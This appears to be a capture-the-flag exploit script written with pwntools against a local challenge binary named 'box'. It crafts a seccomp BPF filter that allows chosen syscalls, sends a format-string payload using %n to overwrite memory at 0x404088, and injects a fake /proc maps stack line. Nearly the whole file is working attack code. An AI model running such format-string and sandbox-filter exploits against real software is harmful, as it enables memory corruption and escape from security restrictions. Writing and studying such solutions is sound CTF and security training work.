from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process(['strace','./box'])
# p=process("./box")
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
import seccomp_asm
fff =p8(0x20)+p8(0)+p8(0)+p8(0)+p32(0)
fff+=p8(0x15)+p8(0)+p8(1)+p8(0)+p32(0x106)
fff+=p8(0x6)+p8(0)+p8(0)+p8(0)+p32(0x7fff0000)
fff+=p8(0x6)+p8(0)+p8(0)+p8(0)+p32(0)
fake=b'132000-7ffffffff000 r--p 00000000 00:00 0                          [stack]'
pay = '''
LD [0]
JEQ 1 0 0x101
RET ALLOW
LD [0x20]
JEQ 1 0 0x80000
RET ALLOW 
RET ERROR 0
'''
fff = seccomp_asm.asm(pay)
gdb.attach(p,'b *0x401558')

p.send(p32(len(fff)))
p.send(fff)
ru("\n")
ru("\n")
target = 0x404088
l = 0x1337
pay = f"%4911c%c%c%c%c%c%c%c%c%n".encode()+p64(0x404088)
p.send(pay.ljust(0x100-1,b'\0'))
p.sendline(fake)
p.interactive()
#import base64
#all = p32(len(fff))+fff+pay.ljust(0x100-1,b'\0')+fake+b"\n"
#print(base64.b64encode(all))